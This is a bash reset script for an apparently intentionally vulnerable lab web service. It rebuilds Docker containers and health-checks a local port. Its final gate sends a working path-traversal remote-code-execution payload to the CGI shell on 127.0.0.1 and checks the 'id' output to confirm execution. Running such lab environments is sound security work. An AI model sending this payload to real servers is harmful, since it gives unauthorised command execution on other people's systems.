#!/usr/bin/env bash
# birch — reset to factory state (fresh build) and health-gate the port.
set -uo pipefail
cd "$(dirname "$0")"
[ -f .env ] || cp .env.example .env
docker compose down -v --remove-orphans >/dev/null 2>&1 || true
if ! docker compose up -d --build >/dev/null 2>&1; then
  echo "RESET-DEGRADED birch — compose up failed (check: docker compose logs)" >&2
  exit 1
fi
c=000
for i in $(seq 1 40); do
  c=$(curl -s -o /dev/null -m 3 -w '%{http_code}' "http://127.0.0.1:18942/" 2>/dev/null) || c=000
  [ "$c" != "000" ] && break
  sleep 2
done
if [ "$c" = "000" ]; then
  echo "RESET-DEGRADED birch (:18942) — no HTTP answer after 80s" >&2
  exit 1
fi

# extra gate: the CGI execution channel must EXECUTE, not merely answer —
# mod_cgid has been known to come up half-alive right after a rebuild.
if ! curl -s -m 8 --data 'echo; id' \
     "http://127.0.0.1:18942/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" 2>/dev/null | grep -q 'uid='; then
  echo "RESET-DEGRADED birch (:18942) — HTTP up but CGI exec channel not live yet; retry or: docker compose up -d --force-recreate" >&2
  exit 1
fi

echo "RESET-OK birch http://127.0.0.1:18942"
